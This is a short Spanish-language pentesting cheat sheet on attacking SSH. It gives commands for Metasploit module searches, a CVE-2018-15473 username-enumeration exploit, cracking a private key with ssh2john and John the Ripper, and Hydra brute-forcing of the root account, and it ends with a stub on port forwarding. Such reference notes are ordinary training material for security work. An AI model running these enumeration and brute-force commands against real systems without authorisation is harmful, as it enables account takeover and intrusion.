---
title: "SSH"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/ssh"
date: "2025-09-30"
---

### Enumeracion con metasploit
```bash
search type:auxiliary name:ssh
```

### Enumerar SSH (V2.3-7.7)
 [exploit SSH-Username-Enumeration CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473)

```
#1 clonar repositorio y luego:
pip3 install -r requirements.txt

#2 Lanzar exploit
./CVE-2018-15473.py <ip> -u <username_dictionary>
```

### Fuerza bruta id_rsa hash SSH

Teniendo el fichero id_rsa, podemos intentar crackearlo por fuerza bruta. Para ello primero debemos pasarlo a un formato que entienda john the ripper:
```bash
ssh2john id_rsa > hash.txt
```

Con el hash.txt obtenido:
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Fuerza bruta servicio SSH
#### Hydra
Si la "l" o "p" son minúsculas, le estamos indicando que utilice literalmente dicho usuario o contraseña. Si es mayúscula, lo utilizaremos para tirar de un diccionario.
```bash
hydra ssh://127.0.0.1 ssh -s 22 -l root -P pass.txt -f -vV 

# con -t 64 indicamos los hilos
hydra -t 64 ssh://127.0.0.1 ssh -s 22 -l root -P pass.txt

```

#### Metasploit
```bash
# search ssh_login, utilizaremos auxiliary/scanner/ssh/ssh_login
Completamos los datos y "run"
# METASPLOIT es un poco mas lento que hydra.
```

### Reenvio de puertos ssh
También llamado local port forwarding ![[Local port forwarding]]


